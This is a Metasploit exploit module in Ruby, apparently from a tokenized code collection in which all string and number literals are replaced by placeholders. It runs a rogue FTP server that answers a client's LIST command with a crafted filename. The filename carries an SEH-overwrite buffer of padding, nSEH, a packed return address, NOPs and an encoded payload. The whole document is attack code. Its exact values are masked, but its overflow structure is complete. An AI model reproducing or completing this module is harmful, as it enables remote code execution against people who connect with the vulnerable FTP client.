class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: Remote :: FtpServer def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <int> , <str> = > <hex> } ] , ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) end def setup super end def on_client_unknown_command ( c , cmd , arg ) c . put ( <str> ) end def on_client_command_list ( c , arg ) conn = establish_data_connection ( c ) if ( not conn ) c . put ( <str> ) return end print_status ( <str> ) code = <int> c . put ( <str> code <str> ) code = <int> c . put ( <str> code <str> ) offset_to_nseh = target [ <str> ] filename = <str> padding = <str> * ( offset_to_nseh - filename . length ) nseh = <str> seh = [ target . ret ] . pack ( <str> ) nops = <str> * <int> junk2 = <str> * <int> buffer = filename + padding + nseh + seh + seh + nops + payload . encoded + junk2 print_status ( <str> ) dirlist = <str> buffer <str> conn . put ( dirlist ) conn . close print_status ( <str> ) return end end 
